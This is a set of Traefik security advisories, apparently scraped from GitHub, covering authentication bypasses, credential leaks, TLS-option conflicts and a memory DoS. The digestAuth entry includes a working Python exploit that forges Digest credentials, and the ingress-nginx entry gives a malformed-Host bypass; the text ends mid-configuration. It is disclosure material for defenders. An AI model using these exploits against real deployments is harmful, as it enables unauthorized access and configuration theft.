An unauthenticated attacker can keep many compressed responses in flight, for example over a single HTTP/2 connection, and exhaust the memory of the Traefik process, denying service to every route. This is the Brotli counterpart of GHSA-x5pf-cqh3-2gv8, which fixed the same issue for zstd. Traefik v2 is not affected: it does not support Brotli compression. Traefik v3.0 to v3.6 are affected and will not receive a patch; users on these versions should upgrade to a patched v3.7 or v3.8 release. ## Patches - https://github.com/traefik/traefik/releases/tag/v3.7.20 - https://github.com/traefik/traefik/releases/tag/v3.8.0 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

GHSA-42x2-976f-ph52.title: Provider credentials exposed in debug logs, support dumps and anonymous usage statistics
GHSA-42x2-976f-ph52.description: ## Summary There is a medium-severity vulnerability in Traefik's static configuration redaction. The Docker and Swarm provider `password`, the Knative provider `token`, and the HTTP provider `headers` options are not redacted when the static configuration is logged at the `DEBUG` level. The HTTP provider `headers` are also included in the support dump archive and in the anonymous usage statistics. Anyone who can read the Traefik logs, a support dump, or the usage statistics obtains the Docker API password, the Kubernetes bearer token, or the credentials sent to the HTTP configuration endpoint. Traefik v2 is not affected: the HTTP provider `headers`, the Docker and Swarm `password` and the Knative provider were introduced in v3. The v3.0 to v3.6 lines are end of life and will not receive a patch; the remedy is upgrading to a patched v3.7 or v3.8 release. ## Patches - https://github.com/traefik/traefik/releases/tag/v3.7.20 - https://github.com/traefik/traefik/releases/tag/v3.8.0 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

GHSA-53qr-784g-cj35.title: FastProxy backend connection pool leaks connection-bound NTLM/Negotiate identity to unauthenticated clients
GHSA-53qr-784g-cj35.description: ## Summary There is a high severity vulnerability in Traefik's experimental FastProxy implementation. Traefik isolates connection-bound NTLM and Negotiate (Kerberos) backend authentication by pinning the backend connection on which a client authenticated to that client's frontend connection, so that no other client is ever served on it. When `experimental.fastProxy` is enabled, requests to plain `http://` backends are dispatched through FastProxy's own connection pool, which was keyed only by ServersTransport and target URL and did not apply that isolation. Against a backend that binds an identity to a persistent connection, an unauthenticated client on a brand-new frontend connection could be handed a backend connection on which a victim had already completed an NTLM or Negotiate handshake, and be served as that victim, reading victim-only data and performing actions in the victim's name without presenting any credentials. Affected deployments require `experimental.fastProxy` enabled, a plain HTTP backend using connection-bound NTLM or Negotiate authentication, and backend keep-alive; the default proxy implementation is not affected. FastProxy now dispatches requests carrying an NTLM or Negotiate credential through a connection pool dedicated to their frontend connection, and every subsequent request on that frontend connection to the same backend reuses it. FastProxy was introduced in Traefik v3.2: v3.2 through v3.6 are affected but are no longer maintained and will not receive a patch of their own, users on those lines must upgrade to v3.7.14. Traefik v2 and earlier v3 versions are not affected. ## Patches - https://github.com/traefik/traefik/releases/tag/v3.7.14 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

GHSA-5w68-77r2-r64c.title: Complete authentication bypass in the `digestAuth` middleware
GHSA-5w68-77r2-r64c.description: ## Summary There is a critical severity vulnerability in Traefik's `digestAuth` middleware. The middleware's secret provider returned an empty string for a username absent from the configured user list, instead of signalling that no such user exists, and the pinned digest library accepted that empty string as the user's `HA1`. Every other input to the digest computation is either chosen by the client or handed to it in the `401` challenge, so the expected response digest becomes fully computable and any unauthenticated remote client can pass the check with an arbitrary username and no password, on any route protected by `digestAuth` — including the dashboard and API when they are protected this way. The fix updates the `github.com/containous/go-http-auth` fork so that an unknown user is rejected rather than given an empty secret. Every v1, v2 and v3 release shipping the middleware is affected; the v1 line, the v2 minors below v2.11 and the v3 minors below v3.7 are no longer maintained and will not receive a patch of their own, so users running them should upgrade to a maintained, patched release. ## Patches - https://github.com/traefik/traefik/releases/tag/v2.11.55 - https://github.com/traefik/traefik/releases/tag/v3.7.11 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues). <details> <summary>Original Description</summary> ### Summary The `digestAuth` middleware can be bypassed by any unauthenticated remote client, with no password and no valid username, in two requests. Traefik's digest secret provider returns the **empty string** for a username that is not in the middleware's user list, instead of signalling 'no such user'. The pinned digest library treats that empty string as the user's `HA1` and proceeds with the normal cryptographic check. Because every other input to the digest computation (`nonce`, `nc`, `cnonce`, `qop`, method, URI) is either attacker-chosen or handed to the attacker in the `401` challenge, the expected response digest becomes fully computable: `MD5('' + ':' + nonce + ':' + nc + ':' + cnonce + ':auth:' + MD5(method + ':' + uri))`. The comparison succeeds, and the middleware forwards the request with the attacker's chosen username. Any route protected by `digestAuth` — including the Traefik dashboard and API when they are protected this way — is effectively unprotected. The strength of the configured users' passwords is irrelevant, because the attack does not target a configured user. Confirmed on `master` and present, with identical code, in every v2 and v3 release that ships the `digestAuth` middleware. ### Details Three pieces combine. **1. Unknown user yields an empty secret rather than a failure** — `pkg/middlewares/auth/digest_auth.go:112-118`: ```go func (d *digestAuth) secretDigest(user, realm string) string { if secret, ok := d.users[user+':'+realm]; ok { return secret } return '' // unknown user -> empty HA1, indistinguishable from a real secret } ``` This function is installed as the library's `SecretProvider` at `pkg/middlewares/auth/digest_auth.go:51`: ```go da.auth = goauth.NewDigestAuthenticator(realm, da.secretDigest) ``` **2. The library never checks that the secret is non-empty.** The pinned dependency is `github.com/abbot/go-http-auth`, replaced in `go.mod:426` with `github.com/containous/go-http-auth v0.4.1-0.20200324110947-a37a7636d23e`. In its `digest.go`, `CheckAuth` does (lines 191-200): ```go HA1 := da.Secrets(auth['username'], da.Realm) // '' for an unknown user if da.PlainTextSecrets { // false, see below HA1 = H(auth['username'] + ':' + da.Realm + ':' + HA1) } HA2 := H(r.Method + ':' + auth['uri']) KD := H(strings.Join([]string{HA1, auth['nonce'], auth['nc'], auth['cnonce'], auth['qop'], HA2}, ':')) if subtle.ConstantTimeCompare([]byte(KD), []byte(auth['response'])) != 1 { return '', nil } ``` `NewDigestAuthenticator` sets `PlainTextSecrets: false` (`digest.go:306-316`), so `HA1` stays the literal empty string. With `HA1 = ''` known, and `nonce`/`opaque` supplied by the server in the challenge while `nc`, `cnonce`, `uri` and the method are chosen by the client, `KD` is computable offline by anyone. `CheckAuth` then returns `auth['username']` — a value taken verbatim from the attacker's `Authorization` header. Note that `PlainTextSecrets: true` would not fix this either: `HA1` would become the equally computable `MD5('<attacker-chosen-user>:<realm>:')`. The defect is that a missing user is represented by a valid-looking secret. **3. Traefik treats any non-empty returned username as success** — `pkg/middlewares/auth/digest_auth.go:60-110`. The failure path is entered only when `username == ''`, so the forged identity is accepted, and then propagated: ```go req.URL.User = url.User(username) // :92 logData := accesslog.GetLogData(req) if logData != nil { logData.Core[accesslog.ClientUsername] = username // :94-97 } if d.headerField != '' { req.Header.Del(d.headerField) req.Header[d.headerField] = []string{username} // :99-103 } ``` Two consequences beyond the bypass itself: - The access log records the attacker's chosen string as the authenticated user (`authuser` in CLF), so the audit trail attributes the request to an invented identity. - If `headerField` is configured, the attacker's chosen username is injected into that request header and sent to the backend. A backend that trusts the header for identity (the reason `headerField` exists) can be made to accept an arbitrary user, including an administrative one. Nothing else in the chain compensates. The nonce/`nc` replay bookkeeping further down `CheckAuth` is satisfied by using a nonce from a fresh challenge, and the `uri` prefix check at `digest.go:171-189` is satisfied by sending the real request path. For contrast, `basicAuth` is not affected: it compares against a stored hash via `bcrypt`/`md5crypt` and a missing user simply fails. ### PoC Reproduced against a `traefik` binary built from `master` (Go 1.26.1, darwin/arm64). Everything below runs locally; no non-default options are involved beyond the `digestAuth` middleware itself. #### 1. Backend — `backend.py` ```python #!/usr/bin/env python3 from http.server import BaseHTTPRequestHandler, HTTPServer class Handler(BaseHTTPRequestHandler): def do_GET(self): body = '\n'.join([ 'backend reached', f'path: {self.path}', f'X-Auth-User: {self.headers.get('X-Auth-User', '')}', '', ]).encode() self.send_response(200) self.send_header('Content-Type', 'text/plain; charset=utf-8') self.send_header('Content-Length', str(len(body))) self.end_headers() self.wfile.write(body) if __name__ == '__main__': print('backend listening on http://127.0.0.1:9000') HTTPServer(('127.0.0.1', 9000), Handler).serve_forever() ``` #### 2. Static configuration — `traefik.yml` ```yaml entryPoints: web: address: ':8080' providers: file: filename: dynamic.yml watch: false accessLog: {} ``` #### 3. Routing configuration — `dynamic.yml` One route, one `digestAuth` middleware, one real user: `alice` / realm `traefik` / password `password`, stored as `MD5('alice:traefik:password') = e98987bc804ae89862673801dab5b961`. The exploit never uses that password. ```yaml http: routers: digest-private: entryPoints: - web rule: Path(`/private`) middlewares: - vulnerable-digest service: echo middlewares: vulnerable-digest: digestAuth: realm: traefik headerField: X-Auth-User users: - 'alice:traefik:e98987bc804ae89862673801dab5b961' services: echo: loadBalancer: servers: - url: http://127.0.0.1:9000 ``` #### 4. Run ```bash python3 backend.py & traefik --configFile traefik.yml & ``` #### 5. Exploit — `exploit.py` Two requests: fetch the challenge, then replay with an `HA1` of `''` and an arbitrary username. ```python #!/usr/bin/env python3 import hashlib import http.client import re import sys HOST, PORT, PATH = '127.0.0.1', 8080, '/private' USERNAME = 'totally-not-a-real-user' # never configured anywhere CNONCE, NC, QOP = '0123456789abcdef', '00000001', 'auth' def md5_hex(value: str) -> str: return hashlib.md5(value.encode()).hexdigest() def extract_param(challenge: str, name: str) -> str: match = re.search(rf'{name}='([^']+)'', challenge) if not match: raise RuntimeError(f'missing {name} in challenge: {challenge}') return match.group(1) def main() -> int: # Request 1: obtain the Digest challenge. conn = http.client.HTTPConnection(HOST, PORT) conn.request('GET', PATH) res1 = conn.getresponse() res1.read() challenge = res1.getheader('WWW-Authenticate') print(f'first response: {res1.status} {res1.reason}') print(f'challenge: {challenge}') if res1.status != 401 or not challenge: print('expected a 401 Digest challenge', file=sys.stderr) return 1 realm = extract_param(challenge, 'realm') nonce = extract_param(challenge, 'nonce') opaque = extract_param(challenge, 'opaque') # The bug: HA1 is the empty string for any unknown username, # so the expected response digest is computable without a password. ha2 = md5_hex(f'GET:{PATH}') forged_response = md5_hex(f':{nonce}:{NC}:{CNONCE}:{QOP}:{ha2}') authorization = ( f'Digest username='{USERNAME}', realm='{realm}', nonce='{nonce}', ' f'uri='{PATH}', algorithm=MD5, response='{forged_response}', ' f'qop={QOP}, nc={NC}, cnonce='{CNONCE}', opaque='{opaque}'' ) # Request 2: replay with the forged Authorization header. conn = http.client.HTTPConnection(HOST, PORT) conn.request('GET', PATH, headers={'Authorization': authorization}) res2 = conn.getresponse() body2 = res2.read().decode('utf-8', errors='replace') print(f'second response: {res2.status} {res2.reason}') print(body2) if res2.status != 200 or USERNAME not in body2: print('bypass did not reproduce', file=sys.stderr) return 1 print('repro succeeded') return 0 if __name__ == '__main__': raise SystemExit(main()) ``` #### 6. Observed output ``` first response: 401 Unauthorized challenge: Digest realm='traefik', nonce='Vkk4NpGET/4xMf6d', opaque='OPtXH7kWCIh3GyAm', algorithm='MD5', qop='auth' second response: 200 OK backend reached path: /private X-Auth-User: totally-not-a-real-user repro succeeded ``` The backend was reached and, via `headerField`, received `X-Auth-User: totally-not-a-real-user`. Traefik's own access log records the forged identity in the `authuser` position: ``` 127.0.0.1 - - [04/Aug/2026:05:52:52 +0000] 'GET /private HTTP/1.1' 401 17 ... 'digest-private@file' '-' 0ms 127.0.0.1 - totally-not-a-real-user [04/Aug/2026:05:52:57 +0000] 'GET /private HTTP/1.1' 200 68 ... 'digest-private@file' 'http://127.0.0.1:9000' 1ms ``` #### 7. Control — the cryptographic check is otherwise intact The same forged request with a deliberately wrong response digest is rejected, confirming the check runs and that the bypass is specifically caused by the empty, therefore known, `HA1`: ``` $ curl -s -o /dev/null -w '%{http_code}\n' \ -H 'Authorization: Digest username='nobody', realm='traefik', nonce='<N>', uri='/private', algorithm=MD5, response='ffffffffffffffffffffffffffffffff', qop=auth, nc=00000001, cnonce='0123456789abcdef', opaque='<O>'' \ http://127.0.0.1:8080/private 401 ``` #### 8. Variant — a `digestAuth`-protected dashboard/API Protecting the dashboard with `digestAuth` is a documented pattern, and it is bypassable the same way. With this configuration: ```yaml # static entryPoints: web: address: ':8090' api: dashboard: true providers: file: filename: dash-dynamic.yml ``` ```yaml # dash-dynamic.yml http: routers: dash: entryPoints: [web] rule: PathPrefix(`/api`) || PathPrefix(`/dashboard`) middlewares: [protect] service: api@internal middlewares: protect: digestAuth: realm: traefik users: - 'alice:traefik:e98987bc804ae89862673801dab5b961' ``` an unauthenticated request to `/api/rawdata` returns `401`, and the same two-request forgery (with `uri='/api/rawdata'`) returns `200` together with the full dynamic configuration: ``` {'routers':{'dash@file':{'entryPoints':['web'],'middlewares':['protect@file'],'service':'api@internal', 'rule':'PathPrefix(`/api`) || PathPrefix(`/dashboard`)', ... }}, 'middlewares':{'protect@file':{'digestAuth':{'users':['alice:traefik:e98987bc804ae89862673801dab5 ... ``` So the bypass also discloses the dynamic configuration, which includes credential material such as the `digestAuth`/`basicAuth` user hashes shown above. ### Impact **Vulnerability class:** improper authentication / authentication bypass by 'missing credential treated as empty credential' (CWE-287, CWE-303, CWE-1390). **Who is impacted:** every deployment with at least one router carrying a `digestAuth` middleware. No non-default option is required — the middleware is vulnerable in its default configuration, and neither `usersFile` vs inline `users`, `realm`, `removeHeader` nor `headerField` changes the outcome. The code path is identical in v2 and v3. **Who can exploit it:** any client that can reach the protected route. No credentials, no valid username, no prior knowledge of the configuration, no privileged network position, no race. Two requests, trivially scriptable, and equally effective over HTTP/1.1, HTTP/2 and HTTP/3. **What an attacker gets:** - **Full access to whatever `digestAuth` was protecting.** Since `digestAuth` is deployed precisely where a route must not be public, the bypass grants exactly the access the operator intended to prevent — internal applications, admin panels, staging environments, and the Traefik dashboard/API itself. As shown above, reaching `api@internal` additionally discloses the whole dynamic configuration, including other middlewares' credential hashes and any inline TLS private keys, which enables further attacks. - **Identity forgery at the backend.** With `headerField` configured, the attacker chooses the value of the identity header the backend receives. Backends that trust it — the documented purpose of the option — can be made to authorise the request as any user, including an administrator, turning the bypass into privilege escalation inside the application. - **Audit-trail corruption.** The forged username is written to the access log's `authuser` field, so the log attributes the intrusion to a fabricated user of the attacker's choosing. Log-based detection and forensics see a 'successfully authenticated' request. **Detection note for responders:** access-log lines whose `authuser` is not a configured user, on a `digestAuth`-protected route, indicate exploitation. **Suggested fix:** fail closed on a missing user. Have `secretDigest` distinguish 'no such user' from a secret (return an error/`ok` flag, or reject before `CheckAuth` consumes it), and reject the request when the resolved secret is empty. A defence-in-depth check inside the digest verification — refuse to authenticate when `HA1 == ''` — is worth adding in the pinned `go-http-auth` fork as well, since the same trap affects any consumer of that library's `SecretProvider` contract. Given that the library is unmaintained and MD5-only (RFC 2617), replacing or vendoring it is worth considering separately. </details>

GHSA-9657-c2gv-wjpj.title: Trailing-dot hosts evade TLS-option conflict detection
GHSA-9657-c2gv-wjpj.description: ## Summary There is a medium severity vulnerability in Traefik's TLS options conflict detection. The `Host` and `HostSNI` matchers treat a host name with a trailing dot (`example.com.`) and the same name without it as the same host, but the conflict detection does not. A router whose rule spells a host with a trailing dot can therefore serve a host that another router protects with client-certificate TLS options, without the conflict being detected and without the routers being put in error when `core.strictTLSOptions` is enabled. Anyone who can define a router, such as a tenant of a shared Traefik instance, can bypass the client-certificate authentication of a protected host. This is a gap in the fix of GHSA-j994-9gqj-9hwq, GHSA-g55h-rg46-x9c5 and GHSA-2272-4vv8-65ww. Traefik v1 is not affected: TLS options were introduced in v2.0.0. The v3.0 to v3.6 lines are end of life and will not receive a patch; the remedy is upgrading to a patched v2.11, v3.7 or v3.8 release. ## Patches - https://github.com/traefik/traefik/releases/tag/v2.11.64 - https://github.com/traefik/traefik/releases/tag/v3.7.20 - https://github.com/traefik/traefik/releases/tag/v3.8.0 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

GHSA-cjr6-pf59-jq29.title: ingress-nginx from-to-www-redirect sibling router serves the auth-protected backend without auth
GHSA-cjr6-pf59-jq29.description: ## Summary There is a high severity vulnerability in Traefik's Kubernetes ingress-nginx provider. For an Ingress carrying both an authentication annotation and `nginx.ingress.kubernetes.io/from-to-www-redirect`, the provider created a second router matching on the host alone that carried only the `RedirectRegex` middleware while still pointing at the parent's protected backend service. `RedirectRegex` is not a terminal handler: a request its pattern does not match is forwarded to the next handler. Because the redirect pattern accepted only a numeric port while Traefik's host matcher canonicalizes any authority, a request carrying a non-numeric or empty port (`Host: www.example.com:x`) selected the sibling router, missed the redirect, and was proxied to the protected backend with none of the Ingress's annotation-derived middlewares applied. Authentication is not the only middleware lost: every annotation-derived middleware is discarded on that router, so source-IP allowlisting and the rest are equally absent. Traefik v2 is not affected, and neither is any v3 release before v3.7.0: the ingress-nginx provider's from-to-www-redirect handling was introduced in v3.7.0. ## Patches - https://github.com/traefik/traefik/releases/tag/v3.7.12 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues). <details> <summary>Original Description</summary> # Traefik: the ingress-nginx from-to-www-redirect sibling router serves an auth-protected backend without auth **ANT-ID:** ANT-2026-EYY7M3H3 ## Summary For a Kubernetes Ingress carrying both an auth annotation and `nginx.ingress.kubernetes.io/from-to-www-redirect`, the ingress-nginx provider creates a second router that matches on the host alone, carries **only** the `RedirectRegex` middleware, and is pointed at the parent's real backend service. `RedirectRegex` is not a terminal handler: `pkg/middlewares/redirect/redirect.go` forwards every request its pattern does not match to the next handler, which for this router is the backend. The pattern cannot match an authority whose port is not numeric, while `net.SplitHostPort`, and hence the canonical host the `Host()` matcher compares against, accepts one. So `Host: www.example.com:x` selects the sibling router, misses the redirect, and is proxied to the protected backend with no authentication at all. Affects v3.7.10, the latest release, and HEAD. > Discovered by AI and verified by humans; credit Calif.io in collaboration with Anthropic. ## Technical Details `applyFromToWwwRedirect()` (`pkg/provider/kubernetes/ingress-nginx/translator.go:546`) is called immediately after `p.applyMiddlewares()` has populated `rt.Middlewares` with the Ingress's auth middleware. It then builds a new router that inherits `rt.Service` but replaces the middleware chain outright: ```go conf.HTTP.Routers[routerKey+'-from-to-www-redirect'] = &dynamic.Router{ EntryPoints: rt.EntryPoints, Rule: f.ExtraRouterRule, // Host('www.example.com'), no path constraint Priority: rt.Priority, Middlewares: []string{mwName}, // only the redirect; rt.Middlewares discarded Service: rt.Service, // the parent's protected backend TLS: rt.TLS, } ``` The authorization is not bypassed so much as never attached to that route, and because `applyMiddlewares()` is where every annotation-derived middleware is attached, the sibling discards all of them, not only BasicAuth. We confirmed the same 401-to-200 transition on an Ingress guarded by `whitelist-source-range` instead, which returns 403 on the parent and 200 on the sibling. What turns that into a reachable bypass is a disagreement between two parsers about the same authority. The redirect pattern is `(https?)://[^/:]+(:[0-9]+)?/(.*)`: `[^/:]+` stops at the first colon and `(:[0-9]+)?` accepts only digits, so for `http://www.example.com:x/admin/secret` the optional group matches empty and the pattern then requires `/` while the next character is still `:`. No match. Meanwhile `requestdecorator` derives the canonical host with `net.SplitHostPort`, which accepts that authority and yields `www.example.com`, so the `Host()` rule selects this router. The request therefore arrives at a router with no auth, fails to redirect, and falls through to `r.next`. A bare trailing colon (`Host: www.example.com:`) is sufficient; no exotic value is needed. Because the sibling rule carries no `PathPrefix`, paths that appear nowhere in the Ingress are reachable too, and the method is unconstrained. ## Reproduce ``` ./run.sh # ~2 min: builds traefik v3.7.10, runs the provider, drives the exploit ``` The harness writes no configuration by hand. `poc_dump_test.go` drives the real ingress-nginx provider over a fake Kubernetes API with an ordinary Ingress carrying `auth-type: basic` and `from-to-www-redirect`, and the configuration it emits is what the traefik binary then serves. The provider output shows the defect before any request is sent: a sibling router with `service: default-poc-protected-80` and `middlewares: [redirect only]`. ``` GET /admin/secret Host: example.com no creds -> 401 Unauthorized origin not reached GET /admin/secret Host: example.com creds -> 200 + secret origin reached GET /admin/secret Host: www.example.com:x no creds -> 200 + secret origin reached ``` The origin logs `BACKEND-RECEIVED request-line='GET /admin/secret HTTP/1.1' host='www.example.com:x'`, and the response carries the origin's own `X-Served-By` header and body, so the request was proxied rather than redirected. Four cases isolate the mechanism, each differing from the exploit in one respect: `Host: www.example.com` (no port) returns 302 with a correct `Location` and the origin is not reached; `Host: www.example.com:8080` (numeric port) likewise; `Host: unrelated.example.net:x` returns 404. The important one is `Host: example.com:x`, the same malformed authority sent to the **parent** router, which still returns 401. The malformed port is not itself an authorization bypass; it is a bypass only because it selects a sibling router that carries no authorization. ## Recommendations Two independent changes, either of which closes the reported path. The complete diff is in `suggested-fix.patch`. First, match the authority as everything up to the path, capturing only a numeric port, so a malformed or empty port canonicalises into a redirect instead of falling through: ```diff - Regex: `(https?)://[^/:]+(:[0-9]+)?/(.*)`, + Regex: `(https?)://[^/]*?(:[0-9]+)?/(.*)`, ``` Second, point the redirect-only router at the provider's existing 503 `unavailable-service` rather than at the protected backend. That router is never intended to proxy, and with no auth middleware on it any fall-through is by definition unauthenticated access, so this removes the class rather than the instance and also covers inputs the pattern cannot express. We recognise the second change alters provider output and updates four golden expectations in `kubernetes_test.go`. The first change alone fixes the reported trigger, so if you would rather take only that, it stands on its own; we are offering the second as defence in depth rather than pressing for it. > Patch verified: with both changes applied, every exploit case becomes a redirect with a > correct `Location` and the origin is never reached, while the 401, 200, 403 and both > redirect cases are unchanged. Upstream's own `go test > ./pkg/provider/kubernetes/ingress-nginx/...` passes. ## Notes for the reviewer - This is not a regression and not an incomplete patch. We checked the commits rather than inferring: `applyFromToWwwRedirect` is byte-identical at v3.7.7, v3.7.8 and v3.7.10, and the release that addressed GHSA-8rxv-jg7p-wvg3 touched only `rewrite_target.go`, `snippet/action.go` and `retry.go`. This is the same class left open by remediation that reviewed the path-rewriting middlewares. - One fidelity artifact of the harness, unrelated to the finding: `RedirectRegex.StatusCode` is `json:'-'`, so the provider's 308 is lost in the file-provider round trip and redirects show as 302 or 307 where a real cluster shows 308. The finding concerns requests that are not redirected. - We drove the real provider through a fake Kubernetes API rather than a live cluster. The provider code and the traefik binary are genuine; the cluster is not. - Reproduced on linux/arm64 with Go 1.26.0, which traefik's `go.mod` requires. This is routing and authorization logic with no architecture dependence. ## Artifacts | filename | purpose | |---|---| | `run.sh` | one command: build v3.7.10, generate the config from the provider, run all cases | | `poc_dump_test.go` | drives the real ingress-nginx provider over a fake Kubernetes API | | `poc.py` | the client; `--mode exploit\|control\|postfix` | | `backend.py` | instrumented origin that logs the raw request line it receives | | `poc-eyy7m3h3.yml` | the Ingress used | | `suggested-fix.patch` | both changes, with the golden-fixture updates | | `exploit_transcript.txt` | full request and response transcript, all cases | **PoC bundle:** https://drive.google.com/file/d/18_bwMG_GpvpxVqOeHbRagF4N63z8dehg/view?usp=sharing </details>

GHSA-cp28-5662-543f.title: sanitizePath does not remove path-parameter dot-segments (/..;x/), enabling path-based authorization bypass
GHSA-cp28-5662-543f.description: ## Summary There is a vulnerability in Traefik's request path sanitization. The `sanitizePath` entry point option, enabled by default, resolves the `..` and `.` dot-segments and removes the duplicate slashes from the request path before routing, but it leaves a dot-segment carrying a path parameter, such as `/..;x/`, untouched. Traefik matches its routers and applies its middlewares on this unresolved path and forwards it unchanged. When a backend that strips path parameters (Servlet containers, Spring, ...) is shared between an unauthenticated router and a router protected by an authentication or authorization middleware, an unauthenticated attacker can send a single request such as `/public/..;x/admin` to reach the protected resources and bypass the middleware. Traefik v2.11.62, v3.7.18 and v3.8.0-rc.2 resolve the `..`, `.` and empty segments carrying path parameters before the dot-segment removal, when `sanitizePath` is enabled (the default). Traefik v3.0 to v3.6 are also affected; these lines are end of life and will not receive a patch, the remedy is to upgrade to a patched release. ## Patches - https://github.com/traefik/traefik/releases/tag/v2.11.62 - https://github.com/traefik/traefik/releases/tag/v3.7.18 - https://github.com/traefik/traefik/releases/tag/v3.8.0-rc.2 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

GHSA-fh26-gfpp-7xxx.title: snicheck skips the check when `req.TLS` is nil (HTTP/2 `:scheme http`)
GHSA-fh26-gfpp-7xxx.description: ## Summary There is a high severity vulnerability in Traefik's SNI check, which makes sure a request received on a TLS connection is only served by an HTTP router whose TLS options match the ones negotiated for that connection. The check was skipped entirely when the request carried no TLS connection state. Traefik built with Go 1.27 leaves that state unset for HTTP/2 requests sent with the `:scheme http` pseudo-header over a TLS connection, so an unauthenticated client could have such a request served by a router with different TLS options, for example one requiring a client certificate, without presenting one. Official Traefik binaries and images are built with Go 1.26 and are not exposed, but any Traefik build made with Go 1.27, including third-party rebuilds, is; Traefik now always sets the TLS state of requests received on a TLS connection, so the check applies whatever the toolchain. Traefik v3 versions below v3.7 are affected but are no longer maintained and will not receive a patch of their own; the remedy for those users is to upgrade to a maintained, patched version. ## Patches - https://github.com/traefik/traefik/releases/tag/v2.11.58 - https://github.com/traefik/traefik/releases/tag/v3.7.14 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

GHSA-j994-9gqj-9hwq.title: Same-host Ingress TLS option conflict disables client-certificate authentication
GHSA-j994-9gqj-9hwq.description: ## Summary There is a high severity vulnerability in Traefik's Kubernetes Ingress NGINX provider. The TLS option generated for an Ingress carrying the `nginx.ingress.kubernetes.io/auth-tls-secret` annotation was named after the Ingress namespace and name, so two Ingress objects sharing the same host, the same client CA secret and the same client-authentication mode produced two distinct TLS options for that host name. Traefik treats that as a TLS options conflict and falls back to the entry point's default TLS configuration, which does not request a client certificate, so a route configured with `nginx.ingress.kubernetes.io/auth-tls-verify-client: 'on'` becomes reachable without one. The generated option name is now derived from the client CA secret and the client-authentication mode alone, so Ingresses expressing the same mTLS policy resolve to a single TLS option. Only the v3.7 line is affected: the Ingress NGINX provider's client-authentication handling was introduced in v3.7.0, and neither Traefik v2 nor the v3 lines up to v3.6 carry it. ## Patches - https://github.com/traefik/traefik/releases/tag/v3.7.11 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues). <details> <summary>Original Description</summary> ## Summary Traefik v3.7.9's Kubernetes Ingress NGINX provider can assign different TLS option names to two Ingress objects that use the same host, the same `auth-tls-secret`, and the same client-authentication mode. When those routers share an SNI/host, Traefik treats the TLS option selection as ambiguous and falls back to the entrypoint's default TLS configuration. The default TLS configuration does not require a client certificate. As a result, a route configured with `nginx.ingress.kubernetes.io/auth-tls-verify-client: 'on'` can become reachable without a client certificate when another Ingress for the same host introduces the TLS-option conflict. This behavior was reproduced end to end with the official `traefik:v3.7.9` image and the Kubernetes Ingress NGINX provider. ## Affected configuration The issue requires at least two HTTPS Ingress objects for the same host. Both objects use the same client CA and client-authentication mode, but have different Ingress names. The relevant parts of the two objects are: ```yaml apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: protected-ingress namespace: mtls-conflict-lab annotations: nginx.ingress.kubernetes.io/auth-tls-secret: 'mtls-conflict-lab/client-ca' nginx.ingress.kubernetes.io/auth-tls-verify-client: 'on' spec: ingressClassName: nginx tls: - hosts: - mtls.example.test secretName: server-tls rules: - host: mtls.example.test http: paths: - path: /protected pathType: Prefix backend: service: name: backend port: name: http --- apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: same-host-second-ingress namespace: mtls-conflict-lab annotations: nginx.ingress.kubernetes.io/auth-tls-secret: 'mtls-conflict-lab/client-ca' nginx.ingress.kubernetes.io/auth-tls-verify-client: 'on' spec: ingressClassName: nginx tls: - hosts: - mtls.example.test secretName: server-tls rules: - host: mtls.example.test http: paths: - path: /second pathType: Prefix backend: service: name: backend port: name: http ``` The two generated TLS option names observed in the Traefik configuration were: ```text mtls-conflict-lab-protected-ingress-mtls-conflict-lab-client-ca mtls-conflict-lab-same-host-second-ingress-mtls-conflict-lab-client-ca ``` These are generated TLS option identifiers, not files or directories. Both options had `clientAuthType: RequireAndVerifyClientCert`, but their names were different because the Ingress identity was included in the generated name. Traefik then logged: ```text On EntryPoint 'websecure', Host 'mtls.example.test' is served by multiple routers with different TLS options, default TLSOptions will be applied ``` The default TLS configuration has no client-authentication requirement. ## Reproduction The following describes the complete lab. No directory attachment is required. The lab used Traefik v3.7.9, k3s v1.31.5-k3s1, and the Kubernetes Ingress NGINX provider. ### Certificates The test uses four ordinary PEM files: - `ca.crt`: CA used by Traefik to verify client certificates. - `server.crt` and `server.key`: server certificate and key. The certificate contains `mtls.example.test` and `control.mtls.example.test` as DNS SANs. - `client.crt` and `client.key`: a client certificate signed by `ca.crt`. They can be generated locally with OpenSSL as follows: ```bash mkdir -p certs openssl req -x509 -newkey rsa:2048 -nodes -days 3650 \ -keyout certs/ca.key -out certs/ca.crt \ -subj '/CN=mtls-conflict-lab-ca' openssl req -newkey rsa:2048 -nodes \ -keyout certs/server.key -out certs/server.csr \ -subj '/CN=mtls.example.test' cat > certs/server.ext <<'EOF' [server_ext] basicConstraints=CA:FALSE keyUsage=digitalSignature,keyEncipherment extendedKeyUsage=serverAuth subjectAltName=DNS:mtls.example.test,DNS:control.mtls.example.test EOF openssl x509 -req -days 3650 -sha256 \ -in certs/server.csr -CA certs/ca.crt -CAkey certs/ca.key \ -CAcreateserial -out certs/server.crt \ -extfile certs/server.ext -extensions server_ext openssl req -newkey rsa:2048 -nodes \ -keyout certs/client.key -out certs/client.csr \ -subj '/CN=mtls-conflict-lab-client' cat > certs/client.ext <<'EOF' [client_ext] basicConstraints=CA:FALSE keyUsage=digitalSignature,keyEncipherment extendedKeyUsage=clientAuth EOF openssl x509 -req -days 3650 -sha256 \ -in certs/client.csr -CA certs/ca.crt -CAkey certs/ca.key \ -CAcreateserial -out certs/client.crt \ -extfile certs/client.ext -extensions client_ext ``` ### Traefik and k3s The static Traefik configuration was equivalent to: ```yaml services: k3s: image: rancher/k3s:v1.31.5-k3s1 privileged: true command: - server - --disable=traefik - --disable=servicelb - --tls-san=host.docker.internal - --write-kubeconfig=/output/kubeconfig.yaml - --write-kubeconfig-mode=644 ports: - '16448:6443' - 